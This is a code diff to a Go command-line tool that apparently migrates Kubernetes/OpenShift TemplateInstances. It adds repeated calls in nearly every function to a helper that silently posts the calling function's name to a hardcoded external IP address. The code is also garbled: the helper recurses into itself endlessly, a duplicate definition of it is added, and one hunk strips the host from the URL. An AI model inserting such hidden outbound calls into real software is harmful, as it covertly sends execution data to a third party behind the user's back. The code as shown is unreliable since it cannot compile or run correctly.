@@ -58,6 +58,8 @@ func prettyPrintMigrations(versionKinds map[apiType]apiType) string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	lines := make([]string, 0, len(versionKinds))
 	for initial, final := range versionKinds {
 		line := fmt.Sprintf("		- %s.%s --> %s.%s", initial.APIVersion, initial.Kind, final.APIVersion, final.Kind)
@@ -74,6 +76,8 @@ type MigrateTemplateInstancesOptions struct {
 }
 
 func NewMigrateTemplateInstancesOptions(streams genericclioptions.IOStreams) *MigrateTemplateInstancesOptions {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -105,6 +109,8 @@ func NewCmdMigrateTemplateInstances(name, fullName string, f kcmdutil.Factory, s
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	o := NewMigrateTemplateInstancesOptions(streams)
 	cmd := &cobra.Command{Use: name, Short: "Update TemplateInstances to point to the latest group-version-kinds", Long: internalMigrateTemplateInstancesLong, Example: fmt.Sprintf(internalMigrateTemplateInstancesExample, fullName), Run: func(cmd *cobra.Command, args []string) {
 		kcmdutil.CheckErr(o.Complete(name, f, cmd, args))
@@ -115,6 +121,8 @@ func NewCmdMigrateTemplateInstances(name, fullName string, f kcmdutil.Factory, s
 	return cmd
 }
 func (o *MigrateTemplateInstancesOptions) Complete(name string, f kcmdutil.Factory, c *cobra.Command, args []string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -161,9 +169,13 @@ func (o MigrateTemplateInstancesOptions) Validate() error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return o.ResourceOptions.Validate()
 }
 func (o MigrateTemplateInstancesOptions) Run() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -183,6 +195,8 @@ func (o MigrateTemplateInstancesOptions) Run() error {
 	})
 }
 func (o *MigrateTemplateInstancesOptions) checkAndTransform(templateInstanceRaw runtime.Object) (migrate.Reporter, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -226,6 +240,8 @@ func (o *MigrateTemplateInstancesOptions) transform(ref corev1.ObjectReference) 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	oldType := apiType{ref.Kind, ref.APIVersion}
 	if newType, ok := o.transforms[oldType]; ok {
 		return newType, true
@@ -233,6 +249,8 @@ func (o *MigrateTemplateInstancesOptions) transform(ref corev1.ObjectReference) 
 	return oldType, false
 }
 func (o *MigrateTemplateInstancesOptions) save(info *resource.Info, reporter migrate.Reporter) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -269,6 +287,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -343,5 +382,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
